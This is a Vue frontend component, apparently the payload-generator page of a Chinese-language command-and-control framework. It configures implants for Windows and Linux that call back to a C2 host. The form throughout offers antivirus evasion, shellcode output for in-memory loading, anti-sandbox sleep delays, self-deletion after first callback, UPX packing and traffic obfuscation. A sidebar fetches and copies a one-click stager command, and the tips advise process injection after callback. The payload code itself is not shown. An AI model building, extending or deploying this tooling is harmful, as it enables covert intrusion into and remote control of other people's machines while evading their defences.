<template>
  <div class="payload-page">
    <el-row :gutter="20">
      <el-col :span="18">
        <el-card shadow="never" class="main-card">
          <template #header>
            <div class="card-header">
              <span class="title-with-icon"><el-icon><Monitor /></el-icon> 受控端生成 (Payload Generator)</span>
              <el-tag type="info" size="small" effect="plain">插件管理中心</el-tag>
            </div>
          </template>

          <el-form :model="form" label-position="top" class="professional-form">
            <!-- Template Missing Warning -->
            <transition name="el-zoom-in-top">
              <el-alert
                v-if="!templatesReady && form.mode === 'patch'"
                title="受控端基础模板未就绪"
                type="warning"
                description="‘二进制补丁’模式需要服务端存在预编译模板。请在服务端终端运行 ./generate_templates.sh，或切换到‘源码级编译’模式。"
                show-icon
                :closable="false"
                style="margin-bottom: 20px"
              />
            </transition>
            <!-- 1. Platform Matrix (Simplified) -->
            <el-form-item label="1. 选择目标平台 (High Value Targets)" required>
              <div class="platform-selector">
                <div class="os-group">
                  <span class="os-label"><el-icon><Monitor /></el-icon> Windows</span>
                  <el-radio-group v-model="form.combinedType">
                    <el-radio-button label="windows_amd64">Win x64</el-radio-button>
                    <el-radio-button label="windows_i386">Win x86</el-radio-button>
                  </el-radio-group>
                </div>
                
                <div class="os-group" style="margin-top: 15px;">
                  <span class="os-label"><el-icon><Cpu /></el-icon> Linux</span>
                  <el-radio-group v-model="form.combinedType">
                    <el-radio-button label="linux_amd64">Linux x64</el-radio-button>
                    <el-radio-button label="linux_arm64">Linux Arm64</el-radio-button>
                  </el-radio-group>
                </div>
              </div>
            </el-form-item>

            <el-row :gutter="20">
              <el-col :span="12">
                <el-form-item label="2. 选择回连监听器" required>
                  <el-select 
                    v-model="form.listenerId" 
                    style="width: 100%" 
                    placeholder="请选择在线监听器"
                    size="large"
                    @change="onListenerChange"
                  >
                    <el-option 
                      v-for="l in activeListeners" 
                      :key="l.id" 
                      :label="`${l.protocol.toUpperCase()} - ${l.bind_ip}:${l.port}`" 
                      :value="l.id" 
                    >
                      <div class="listener-option">
                        <el-tag :type="getProtocolType(l.protocol)" size="small" effect="dark">{{ l.protocol }}</el-tag>
                        <span class="l-addr">{{ l.bind_ip }}:{{ l.port }}</span>
                      </div>
                    </el-option>
                  </el-select>
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="3. 配置回连地址 (C2 Host Override)">
                  <el-input v-model="form.lhost" placeholder="例如: 1.2.3.4 或 c2.domain.com" size="large">
                    <template #prepend><el-icon><Link /></el-icon></template>
                  </el-input>
                </el-form-item>
              </el-col>
            </el-row>

            <!-- Status Box -->
            <div class="preview-box" v-if="selectedListener">
              <div class="preview-item">
                <span class="p-label">回连协议</span>
                <el-tag size="small" :type="getProtocolType(selectedListener.protocol)">{{ selectedListener.protocol }}</el-tag>
              </div>
              <div class="preview-item">
                <span class="p-label">监听端口</span>
                <b class="p-value">{{ selectedListener.port }}</b>
              </div>
              <div class="preview-item">
                <span class="p-label">交互频率</span>
                <b class="p-value">{{ selectedListener.heartbeat_interval || 10 }}s</b>
              </div>
              <div class="preview-item">
                <span class="p-label">加密算法</span>
                <el-tag type="success" size="small" effect="plain">AES-256-GCM</el-tag>
              </div>
            </div>

            <!-- Options Row -->
            <el-row :gutter="20" class="options-row">
              <el-col :span="12">
                <el-form-item label="4. 生成模式">
                  <el-radio-group v-model="form.mode">
                    <el-radio label="patch">
                      二进制补丁 (极速) 
                      <el-tooltip content="通过修改预编译模板字节实现，秒级生成。架构需匹配模板。" placement="top">
                        <el-icon class="info-icon"><QuestionFilled /></el-icon>
                      </el-tooltip>
                    </el-radio>
                    <el-radio label="build">
                      源码级编译 (推荐) 
                      <el-tooltip content="服务端实时调用 Rust 编译器，生成过程约 20-40s，免杀效果更佳。" placement="top">
                        <el-icon class="info-icon"><QuestionFilled /></el-icon>
                      </el-tooltip>
                    </el-radio>
                  </el-radio-group>
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="5. 免杀增强 (Bypass Options)" v-if="form.combinedType.startsWith('windows')">
                  <el-checkbox v-model="form.asShellcode" border size="default" class="shellcode-check">
                    生成 Shellcode (.bin) 用于内存加载
                  </el-checkbox>
                </el-form-item>
              </el-col>
            </el-row>

            <el-collapse v-model="activeCollapse" class="advanced-collapse">
              <el-collapse-item title="隐蔽行为配置 (Stealth Behaviors)" name="stealth">
                <el-row :gutter="40">
                  <el-col :span="12">
                    <el-form-item label="抗沙箱休眠 (Sleep Timer)">
                      <el-input-number v-model="form.sleepTime" :min="0" :max="600" size="small" />
                      <span class="form-hint">秒 (运行前进入深呼吸模拟，绕过动态检测)</span>
                    </el-form-item>
                  </el-col>
                  <el-col :span="12">
                    <el-form-item label="运行后自毁 (Self Destruct)">
                      <el-switch v-model="form.autoDestruct" active-color="#f56c6c" />
                      <span class="form-hint">执行一次自动上线后立即尝试删除自身二进制</span>
                    </el-form-item>
                  </el-col>
                  <el-col :span="12">
                    <el-form-item label="UPX 极限压缩 (Compression)">
                      <el-switch v-model="form.useUPX" active-color="#409EFF" />
                      <span class="form-hint">通过 UPX 压缩二进制体积 (约缩减 60%)</span>
                    </el-form-item>
                  </el-col>
                </el-row>

                <el-divider><el-icon><Lock /></el-icon> 安全加固 (Security Hardening)</el-divider>
                
                <el-row :gutter="40">
                  <el-col :span="12">
                    <el-form-item label="加密盐值 (Encryption Salt)">
                      <el-input v-model="form.encryption_salt" placeholder="由所选监听器自动填入" size="small" readonly>
                        <template #prepend><el-icon><Key /></el-icon></template>
                      </el-input>
                      <span class="form-hint">此项已根据所选监听器自动锁定</span>
                    </el-form-item>
                  </el-col>
                  <el-col :span="12">
                    <el-form-item label="报文混淆 (Packet Obfuscation)">
                      <el-select v-model="form.obfuscation_mode" style="width: 100%" size="small" disabled>
                        <el-option label="无混淆 (None)" value="none" />
                        <el-option label="垃圾数据填充 (Junk Padding)" value="junk" />
                        <el-option label="Base64 编码 (文本特征)" value="base64" />
                        <el-option label="XOR 混淆 (高熵特征)" value="xor" />
                      </el-select>
                      <span class="form-hint">此项已根据所选监听器自动锁定</span>
                    </el-form-item>
                  </el-col>
                </el-row>
              </el-collapse-item>
            </el-collapse>

            <div class="footer-action">
              <div class="url-preview">
                <span class="u-title">预览 Agent 回连特征:</span>
                <span class="u-content">{{ previewUrl }}</span>
              </div>
              <el-button 
                type="warning" 
                size="large" 
                class="generate-btn" 
                :loading="loading" 
                @click="doGenerate"
              >
                <el-icon v-if="!loading"><Download /></el-icon>
                立即生成并分发受控端
              </el-button>
            </div>
          </el-form>
        </el-card>
      </el-col>

      <el-col :span="6">
        <el-card shadow="never" class="stager-card">
          <template #header>
            <div class="stager-header">
              <span class="title-with-icon"><el-icon><Cpu /></el-icon> 一键上线 (Quick Online)</span>
            </div>
          </template>
          <div class="stager-body" v-loading="stagerLoading">
            <div v-if="stagerCommand" class="stager-command-wrapper">
              <div class="command-text-container">
                <code>{{ stagerCommand }}</code>
              </div>
              <el-button 
                type="primary" 
                size="small" 
                :icon="CopyDocument" 
                class="stager-copy-btn"
                @click="copyStagerCommand"
              >
                复制命令
              </el-button>
            </div>
            <div v-else class="stager-placeholder">
              选择平台与监听器以生成命令
            </div>
          </div>
        </el-card>

        <el-card shadow="never" class="tip-card">
          <template #header>
            <div class="tip-header"><el-icon><Warning /></el-icon> 安全开发提示</div>
          </template>
          <ul class="tip-list">
            <li>
              <span class="t-badge">免杀</span>
              <p>生成的二进制文件建议配合<b>流量层混淆</b>，并在上线后第一时间通过<b>内存注入</b>迁移。 </p>
            </li>
            <li>
              <span class="t-badge">特权</span>
              <p>监听器的低端口 (如 53, 443, 80) 在特定 Linux/Windows 系统下运行受控端可能需要<b>管理员/Root</b>权限。 </p>
            </li>
            <li>
              <span class="t-badge">补丁</span>
              <p>二进制补丁模式仅支持 amd64 基础模板，如需其他架构请使用<b>源码编译</b>模式。</p>
            </li>
          </ul>
        </el-card>
      </el-col>
    </el-row>

    <el-dialog 
      v-model="showTerminal"
      :title="`实时构建日志 (Task: ${currentTaskId.slice(0,8)})`"
      width="900px"
      :close-on-click-modal="false"
      :show-close="!isMinimized"
      destroy-on-close
      class="terminal-dialog"
      :style="{ visibility: isMinimized ? 'hidden' : 'visible' }"
      @opened="onTerminalOpened"
      @closed="onTerminalClosed"
    >
      <template #header>
        <div class="custom-dialog-header">
          <span class="el-dialog__title">实时构建日志 (Task: {{ currentTaskId.slice(0,8) }})</span>
          <div class="header-btns">
            <el-button link @click="isMinimized = true"><el-icon><Minus /></el-icon></el-button>
          </div>
        </div>
      </template>
      <div class="terminal-dialog-body">
        <div class="term-toolbar">
           <div class="toolbar-left">
             <el-tag type="info" size="small" effect="dark">LIVE OUTPUT</el-tag>
             <span class="task-id-mini" v-if="currentTaskId">Task: {{ currentTaskId.slice(0, 8) }}</span>
           </div>
           <div class="toolbar-right">
             <el-button link size="small" @click="exportLogs" :disabled="!logBuffer.length">导出日志</el-button>
             <el-divider direction="vertical" />
             <el-button link size="small" @click="clearTerminal">清空屏幕</el-button>
           </div>
        </div>
        <div class="term-body">
          <div ref="terminalContainer" class="xterm-mount"></div>
        </div>
      </div>
    </el-dialog>

    <!-- Floating Build Bubble (Minimized State) -->
    <transition name="el-zoom-in-bottom">
      <div v-if="isMinimized && showTerminal" class="build-bubble" @click="isMinimized = false">
        <div class="bubble-content">
          <el-icon class="pulse-icon"><Cpu /></el-icon>
          <div class="bubble-text">
            <span>构建进行中...</span>
            <small>{{ currentTaskId.slice(0,8) }}</small>
          </div>
        </div>
      </div>
    </transition>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, nextTick, watch } from 'vue'
import { Monitor, Link, Warning, Download, Files, QuestionFilled, Cpu, Lock, Key, Minus, FullScreen, CopyDocument } from '@element-plus/icons-vue'
import { ElMessage } from 'element-plus'
import { getListeners, generateClient, request } from '@/api'
import { Terminal as XTerm } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import 'xterm/css/xterm.css'

const loading = ref(false)
const activeListeners = ref([])
const activeCollapse = ref([])
const showTerminal = ref(false)
const isMinimized = ref(false)
const currentTaskId = ref('')
const logBuffer = ref([])
let xterm = null
let fitAddon = null
let ws = null
const terminalContainer = ref(null)
const templatesReady = ref(true)

// form.combinedType is split into os and arch for backend compatibility
const form = ref({
  combinedType: 'windows_amd64',
  listenerId: '',
  lhost: window.location.hostname || '127.0.0.1',
  mode: 'build', // Default to build now as it is async
  asShellcode: false,
  autoDestruct: false,
  sleepTime: 0,
  aesKey: '',
  useUPX: false,
  encryption_salt: '',
  obfuscation_mode: 'none'
})

const stagerLoading = ref(false)
const stagerCommand = ref('')

// Watch for platform/listener changes to update stager
watch([() => form.value.combinedType, () => form.value.listenerId], () => {
  fetchStagerCommand()
})

onMounted(async () => {
  // Check template status from dashboard API
  try {
    const dashRes = await request.get('/api/dashboard')
    templatesReady.value = dashRes.data.templates_ready
  } catch (e) {
    console.warn("Failed to fetch template status", e)
  }

  try {
    const res = await getListeners()
    activeListeners.value = res.data.filter(l => l.status === 'Running')
    if (activeListeners.value.length > 0) {
      form.value.listenerId = activeListeners.value[0].id
      onListenerChange(form.value.listenerId)
    }
  } catch (error) {
    ElMessage.error('获取监听器列表失败')
  }
})

onUnmounted(() => {
  if (ws) ws.close()
  if (xterm) xterm.dispose()
})

const selectedListener = computed(() => {
  return activeListeners.value.find(l => l.id === form.value.listenerId)
})

const previewUrl = computed(() => {
  if (!selectedListener.value) return '---'
  const proto = selectedListener.value.protocol.toLowerCase()
  if (proto === 'websocket') {
    return `ws://${form.value.lhost}:${selectedListener.value.port}/ws`
  }
  if (proto === '正向tcp' || proto === 'bind-tcp') {
    return `Waiting for connection on ${form.value.lhost}:${selectedListener.value.port}`
  }
  if (proto === 'dns') {
    return `${selectedListener.value.ns_domain}`
  }
  return `${proto}://${form.value.lhost}:${selectedListener.value.port}`
})

const onListenerChange = (id) => {
  const l = activeListeners.value.find(item => item.id === id)
  if (l) {
    form.value.aesKey = l.encrypt_key || ''
    form.value.encryption_salt = l.encryption_salt || ''
    form.value.obfuscation_mode = l.obfuscate_mode || 'none'
    
    // 🔒 严格跟随监听器，不再自动随机生成
    if (!form.value.encryption_salt) {
      console.warn("Selected listener has no encryption salt configured.")
    }

    // Auto switch mode for non-standard listeners/archs
    if (l.protocol === 'DNS' || l.protocol === 'TCP' || l.protocol === '正向TCP' || l.protocol === 'Bind-TCP') {
      form.value.mode = 'build'
    }
  }
}

// 移除 generateRandomSalt 函数以确保安全一致性

const getProtocolType = (p) => {
  const map = { 'WebSocket': 'success', 'DNS': 'warning', 'TCP': 'primary', '正向TCP': 'warning', 'Bind-TCP': 'warning' }
  return map[p] || 'info'
}

const initTerminal = () => {
  if (xterm) return
  xterm = new XTerm({
    theme: {
      background: '#1a1b26',
      foreground: '#a9b1d6',
      cursor: '#f7768e',
      selection: 'rgba(255, 255, 255, 0.3)'
    },
    fontSize: 12,
    fontFamily: '"JetBrains Mono", monospace',
    convertEol: true
  })
  fitAddon = new FitAddon()
  xterm.loadAddon(fitAddon)
  xterm.open(terminalContainer.value)
  fitAddon.fit()
}

const startLogStream = (taskId) => {
  currentTaskId.value = taskId
  showTerminal.value = true
}

const onTerminalOpened = () => {
    initTerminal()
    xterm.writeln(`\x1b[33m[*] 正在连接构建任务流 [${currentTaskId.value}]...\x1b[0m`)
    
    let baseWs = import.meta.env.VITE_API_BASE_URL || ''
    if (!baseWs.startsWith('ws')) {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
      baseWs = baseWs ? baseWs.replace('http', 'ws') : `${protocol}//${window.location.host}`
    }

    const token = localStorage.getItem('cupcake_token')
    const wsUrl = `${baseWs}/api/build/logs/${currentTaskId.value}${token ? '?token=' + encodeURIComponent(token) : ''}`

    if (ws) ws.close()
    ws = new WebSocket(wsUrl)
    
    ws.onopen = () => {
      xterm.writeln(`\x1b[32m[*] 已连接到构建服务器\x1b[0m`)
    }
    
    ws.onmessage = (event) => {
      const packet = JSON.parse(event.data)
      const type = packet.type || packet.msg_type
      const content = packet.content || packet.downloadUrl

      // Strip ANSI codes for the plain text buffer
      const plainContent = (packet.content || '').replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '')
      
      if (type === 'log') {
        xterm.writeln(packet.content)
        logBuffer.value.push(plainContent)
      } else if (type === 'success') {
        xterm.writeln(`\x1b[32m[SUCCESS] 构建完成: ${content}\x1b[0m`)
        logBuffer.value.push(`[SUCCESS] 构建完成: ${content}`)
        downloadFile(content)
      } else if (type === 'error') {
        xterm.writeln(`\x1b[31m[ERROR] 编译失败: ${content}\x1b[0m`)
        logBuffer.value.push(`[ERROR] 编译失败: ${content}`)
      }
    }
    
    ws.onerror = (error) => {
      xterm.writeln(`\x1b[31m[ERROR] WebSocket 连接失败\x1b[0m`)
      console.error('WebSocket error:', error)
    }
    
    ws.onclose = () => {
        if (xterm) xterm.writeln(`\x1b[90m[*] 任务连接已断开\x1b[0m`)
    }
}

const onTerminalClosed = () => {
    isMinimized.value = false
    if (ws) {
        ws.close()
        ws = null
    }
    if (xterm) {
        xterm.dispose()
        xterm = null
    }
}

const downloadFile = async (downloadUrl) => {
    try {
        ElMessage.info('正在准备安全下载通道...')
        // 使用带 Token 的 axios 实例获取文件，避免 401
        const response = await request.get(downloadUrl, { responseType: 'blob' })
        
        const blob = new Blob([response.data], { type: 'application/octet-stream' })
        const url = window.URL.createObjectURL(blob)
        
        const link = document.createElement('a')
        link.href = url
        const filename = downloadUrl.split('/').pop() || 'agent.exe'
        link.setAttribute('download', filename)
        
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        
        window.URL.revokeObjectURL(url)
        ElMessage.success('生成成功，文件已保存到本地')
    } catch (error) {
        console.error('Download error:', error)
        ElMessage.error('产物提取失败: 权限验证过期或网络异常')
    }
}

const exportLogs = () => {
    if (logBuffer.value.length === 0) return
    const blob = new Blob([logBuffer.value.join('\n')], { type: 'text/plain' })
    const url = window.URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', `build_log_${currentTaskId.value.slice(0, 8)}_${new Date().getTime()}.txt`)
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
    window.URL.revokeObjectURL(url)
    ElMessage.success('日志已导出')
}

const clearTerminal = () => { 
    if (xterm) xterm.clear() 
    logBuffer.value = []
}

const doGenerate = async () => {
  if (!form.value.listenerId) {
    return ElMessage.warning('请选择一个有效的监听器')
  }

  loading.value = true
  try {
    const payload = {
      os: form.value.combinedType.split('_')[0],
      arch: form.value.combinedType,
      listener_id: form.value.listenerId,
      host: form.value.lhost,
      method: form.value.mode,
      as_shellcode: form.value.asShellcode,
      auto_destruct: form.value.autoDestruct,
      sleep_time: form.value.sleepTime,
      aes_key: form.value.aesKey,
      use_upx: form.value.useUPX,
      encryption_salt: form.value.encryption_salt,
      obfuscation_mode: form.value.obfuscation_mode
    }

    const response = await generateClient(payload)
    const blobData = response.data
    
    // Attempt to extract TaskID if it looks like JSON (Server might return task_id for both build and patch)
    if (blobData.type === 'application/json' || blobData.size < 2048) {
        const text = await blobData.text()
        try {
            const json = JSON.parse(text)
            if (json.task_id) {
                console.log("Async Task started:", json.task_id)
                startLogStream(json.task_id)
                return
            }
        } catch (e) {
            // Not JSON or missing task_id, continue to direct download
            console.log("Response is not an async task, proceeding to download")
        }
    }

    // Direct download (Patch mode or fallback)
    handleDirectBlob(blobData, form.value.combinedType, payload.os, form.value.asShellcode)
    if (form.value.mode !== 'build') ElMessage.success('补丁生成成功')
  } catch (error) {
    console.error("Generation error:", error)
    ElMessage.error('生成异常: ' + (error.response?.data?.error || error.message))
  } finally {
    loading.value = false
  }
}

const handleDirectBlob = (data, combinedType, os, asShellcode) => {
    const isWindows = os === 'windows'
    const ext = asShellcode ? '.bin' : (isWindows ? '.exe' : '')
    const filename = `agent_${combinedType}${ext}`
    const blob = new Blob([data], { type: 'application/octet-stream' })
    const url = window.URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', filename)
    link.click()
    window.URL.revokeObjectURL(url)
}

const fetchStagerCommand = async () => {
    if (!form.value.listenerId) return
    
    stagerLoading.value = true
    try {
        const os = form.value.combinedType.split('_')[0]
        const arch = form.value.combinedType.includes('arm64') ? 'arm64' : 'x64'
        
        const res = await request.get('/api/stager', {
            params: {
                listener_id: form.value.listenerId,
                os: os,
                arch: arch,
                host: form.value.lhost
            }
        })
        stagerCommand.value = res.data.command
    } catch (e) {
        console.error("Stager generation failed", e)
        stagerCommand.value = ''
    } finally {
        stagerLoading.value = false
    }
}

const copyStagerCommand = () => {
    if (!stagerCommand.value) return
    navigator.clipboard.writeText(stagerCommand.value)
    ElMessage.success('一键上线命令已复制')
}
</script>

<style scoped>
.payload-page {
  padding: 30px;
  background-color: #ffffff; /* Page Background: Pure White */
  height: 100%;
  margin-left: 32px; /* Increased separation from sidebars */
}

.main-card {
  border: 1px solid #edf2f7;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important; /* Soft Shadow Refinement */
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.title-with-icon {
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
}

/* Platform Matrix (Simplified) */
.platform-selector {
  border: 1px solid #ebeef5;
  padding: 15px;
  border-radius: 6px;
  background: #fff;
}

.os-group {
  display: flex;
  align-items: center;
  gap: 15px;
}

.os-label {
  min-width: 100px;
  font-weight: bold;
  color: #606266;
  display: flex;
  align-items: center;
  gap: 6px;
}

:deep(.el-radio-button__inner) {
  border-radius: 4px !important;
  margin-right: 10px;
  border-left: 1px solid #dcdfe6 !important;
}

:deep(.el-radio-button__original-radio:checked + .el-radio-button__inner) {
  background-color: var(--el-color-warning-light-9);
  color: var(--el-color-warning);
  border-color: var(--el-color-warning) !important;
  box-shadow: none !important;
}

.hint {
  font-size: 12px;
  color: #909399;
  margin-top: 8px;
}

/* Info Box */
.preview-box {
  background: #fdf6ec;
  border: 1px dashed #e6a23c;
  display: flex;
  justify-content: space-between;
  padding: 15px 25px;
  border-radius: 6px;
  margin: 20px 0;
}

.p-label {
  display: block;
  font-size: 11px;
  color: #96723e;
  text-transform: uppercase;
  margin-bottom: 4px;
}

.p-value {
  color: #664d03;
  font-size: 14px;
}

.options-row {
  margin-top: 20px;
}

.info-icon {
  font-size: 14px;
  color: #c0c4cc;
  margin-left: 4px;
  vertical-align: middle;
}

.shellcode-check {
  width: 100%;
  margin-top: 0;
}

.advanced-collapse {
  border: none;
  margin-top: 10px;
}

.advanced-collapse :deep(.el-collapse-item__header) {
  border-bottom: 1px solid #ebeef5;
  color: #409eff;
  font-weight: bold;
}

.form-hint {
  font-size: 12px;
  color: #909399;
  margin-left: 10px;
}

/* Footer Section */
.footer-action {
  margin-top: 30px;
  padding-top: 20px;
  border-top: 1px solid #ebeef5;
  text-align: center;
}

.url-preview {
  margin-bottom: 20px;
  padding: 10px;
  background: #f4f4f5;
  border-radius: 4px;
}

.u-title {
  color: #909399;
  font-size: 13px;
  margin-right: 10px;
}

.u-content {
  font-family: 'JetBrains Mono', monospace;
  font-weight: 600;
  color: #303133;
}

.generate-btn {
  width: 250px;
  height: 50px;
  font-weight: 800;
  letter-spacing: 1px;
}

/* Build Terminal Area */
.term-body {
  padding: 0;
  height: 450px; /* Output Height */
  background: #1a1b26;
  border-radius: 4px;
}

.xterm-mount {
  height: 100%;
  padding: 10px;
}
.term-toolbar {
    background: #24283b;
    padding: 8px 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
}

.toolbar-left, .toolbar-right {
    display: flex;
    align-items: center;
    gap: 12px;
}

.task-id-mini {
    color: #565f89;
    font-size: 11px;
    font-family: 'JetBrains Mono', monospace;
}

/* Build Bubble Fixes */
.custom-dialog-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-right: 35px;
}

.build-bubble {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 3000;
  background: #24283b;
  border: 1px solid #414868;
  border-radius: 50px;
  padding: 8px 18px;
  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
  cursor: pointer;
  transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

.build-bubble:hover {
  transform: translateY(-5px) scale(1.05);
  background: #2f334d;
}

.bubble-content {
  display: flex;
  align-items: center;
  gap: 12px;
}

.pulse-icon {
  font-size: 18px;
  color: #7aa2f7;
  animation: bubble-pulse 1.5s infinite;
}

.bubble-text {
  display: flex;
  flex-direction: column;
}

.bubble-text span {
  color: #c0caf5;
  font-size: 12px;
  font-weight: 600;
}

.bubble-text small {
  color: #565f89;
  font-size: 10px;
}

@keyframes bubble-pulse {
  0% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.2); opacity: 0.7; }
  100% { transform: scale(1); opacity: 1; }
}

/* Stager Card */
.stager-card {
  border-radius: 12px;
  background: #1a1b26;
  color: white;
  margin-bottom: 20px;
  border: 1px solid #2e303e;
}

.stager-header {
  color: #7aa2f7;
  font-weight: 600;
  font-size: 14px;
}

.stager-card :deep(.el-card__header) {
  border-bottom: 1px solid #2e303e;
  padding: 12px 20px;
}

.stager-body {
  min-height: 120px;
  display: flex;
  flex-direction: column;
}

.stager-command-wrapper {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.command-text-container {
  background: #16161e;
  padding: 12px;
  border-radius: 6px;
  border: 1px solid #24283b;
  max-height: 150px;
  overflow-y: auto;
}

.command-text-container code {
  color: #00f2ea;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
  word-break: break-all;
  white-space: pre-wrap;
}

.stager-copy-btn {
  width: 100%;
  background: #24283b !important;
  border: 1px solid #414868 !important;
}

.stager-placeholder {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #565f89;
  font-size: 13px;
  text-align: center;
  font-style: italic;
}

.tip-card {
  border-radius: 8px;
}

.tip-header {
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
}

.tip-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

.tip-list li {
  margin-bottom: 15px;
}

.t-badge {
  display: inline-block;
  background: #fdf6ec;
  color: #e6a23c;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: bold;
  margin-bottom: 6px;
}

.tip-list p {
  margin: 0;
  font-size: 13px;
  color: #606266;
  line-height: 1.5;
}

/* Dialog Customization */
:deep(.terminal-dialog .el-dialog__body) {
  padding: 0 !important;
  background: #1a1b26;
}
:deep(.terminal-dialog .el-dialog__header) {
  margin-right: 0;
  padding: 15px 20px;
  border-bottom: 1px solid #2e303e;
}
</style>
